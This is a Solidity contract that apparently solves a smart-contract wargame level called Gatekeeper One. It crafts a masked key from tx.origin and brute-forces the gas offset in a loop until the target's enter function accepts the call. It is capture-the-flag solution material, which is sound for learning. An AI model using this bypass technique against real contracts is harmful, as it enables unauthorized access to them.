pragma solidity ^0.8;

contract GatekeeperOneBreaker {
    function attack(address target) public {
        // gate one is bypassed already by us proxying.
        // gate two is here and thats gas being divisble by 8191
        // gate three is a puzzle where a buffer must fulfill three conditions.
        // this is just saying first 4 bytes == first 2 bytes.
        // ez just make it 0x00 0x00 the uint16(uint160(tx.origin))
        // first 4 bytes must not equal first 8 bytes.
        // so just add something at bytes 8-5 to make it not the same.
        // this is what decides the first 2 bytes, the first 16 bytes of the origin addr.
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        bool success;
        for (uint i = 0; i < 500; i++) {
            (success, ) = target.call{gas: i + 8191 * 10}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
        require(success, "Brute force failed!");
    }
}
